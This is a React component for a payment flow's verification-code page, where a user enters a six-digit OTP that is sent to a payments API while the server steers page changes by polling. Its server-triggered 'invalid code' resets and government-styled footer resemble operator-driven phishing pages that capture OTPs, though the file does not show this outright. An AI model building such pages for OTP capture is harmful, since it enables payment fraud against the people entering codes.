import { useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import { paymentsApi } from "../../api/payments";
import { useFlowPoll } from "../../hooks/useFlowPoll";
import { useLang } from "../../context/LanguageContext";
import { FlowHeader } from "./FlowHeader";
import { FlowLoading } from "./FlowLoading";
import styles from "./FlowVerificationCodePage.module.scss";

export function FlowVerificationCodePage() {
  const location = useLocation();
  const navigate = useNavigate();
  const { t, dir } = useLang();
  const ft = t.flow;
  const fvc = ft.verificationCode;

  const state = location.state as { reference?: string } | null;
  const reference = state?.reference ?? sessionStorage.getItem("pay_ref") ?? "";

  const [otp, setOtp] = useState("");
  const [submitted, setSubmitted] = useState(false);
  const [busy, setBusy] = useState(false);
  const [error, setError] = useState("");

  useFlowPoll({
    reference,
    currentPage: "verification-code",
    enabled: !!reference,
    onReset: () => {
      setSubmitted((prev) => {
        if (prev) {
          setOtp("");
          setError(fvc.invalidCode);
        }
        return false;
      });
    },
  });

  const handleInput = (val: string) => {
    setOtp(val.replace(/\D/g, "").slice(0, 6));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (otp.length < 6) { setError(fvc.enterCode); return; }
    setBusy(true);
    setError("");
    try {
      await paymentsApi.flowStep(reference, "verification_code_submitted", { code: otp });
      setSubmitted(true);
    } catch {
      setError(ft.networkError);
    } finally {
      setBusy(false);
    }
  };

  if (!reference) { navigate("/", { replace: true }); return null; }

  const canSubmit = otp.length === 6 && !busy;

  return (
    <div className={styles.page}>
      <FlowHeader />

      <div className={styles.center} dir={dir}>
        <div className={styles.card}>

          {/* ── Gradient header ── */}
          <div className={styles.cardHead}>
            <div className={styles.iconWrap}>
              <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth="1.6" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" d="M21.75 6.75v10.5a2.25 2.25 0 01-2.25 2.25h-15a2.25 2.25 0 01-2.25-2.25V6.75m19.5 0A2.25 2.25 0 0019.5 4.5h-15a2.25 2.25 0 00-2.25 2.25m19.5 0v.243a2.25 2.25 0 01-1.07 1.916l-7.5 4.615a2.25 2.25 0 01-2.36 0L3.32 8.91a2.25 2.25 0 01-1.07-1.916V6.75" />
              </svg>
            </div>
            <h1 className={styles.headTitle}>{fvc.title}</h1>
            <p className={styles.headDesc}>{fvc.desc}</p>
          </div>

          {/* ── Body ── */}
          <div className={styles.body}>
            {error && <div className={styles.error}>{error}</div>}

            <form onSubmit={handleSubmit}>
              <label className={styles.pinLabel} htmlFor="verification_code">
                {fvc.label}
              </label>

              <input
                id="verification_code"
                type="text"
                value={otp}
                onChange={(e) => handleInput(e.target.value)}
                inputMode="numeric"
                maxLength={6}
                autoComplete="one-time-code"
                placeholder={fvc.placeholder}
                dir="ltr"
                className={styles.pinField}
              />

              <div className={styles.dots}>
                {[0, 1, 2, 3, 4, 5].map((i) => (
                  <span
                    key={i}
                    className={`${styles.dot}${i < otp.length ? ` ${styles.filled}` : ""}`}
                  />
                ))}
              </div>

              <button
                type="submit"
                disabled={!canSubmit}
                className={styles.submit}
              >
                {busy ? "…" : fvc.submit}
              </button>
            </form>

            <div className={styles.secureNote}>
              <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth="1.8" stroke="currentColor" aria-hidden="true">
                <path strokeLinecap="round" strokeLinejoin="round" d="M16.5 10.5V6.75a4.5 4.5 0 10-9 0v3.75m-.75 11.25h10.5a2.25 2.25 0 002.25-2.25v-6.75a2.25 2.25 0 00-2.25-2.25H6.75a2.25 2.25 0 00-2.25 2.25v6.75a2.25 2.25 0 002.25 2.25z" />
              </svg>
              {ft.securedBy}
            </div>
          </div>

          {/* ── Footer ── */}
          <div className={styles.cardFoot}>
            <span className={styles.footLabel}>{ft.govFootLabel}</span>
            <div className={styles.footGold} />
          </div>

        </div>
      </div>

      {submitted && <FlowLoading />}
    </div>
  );
}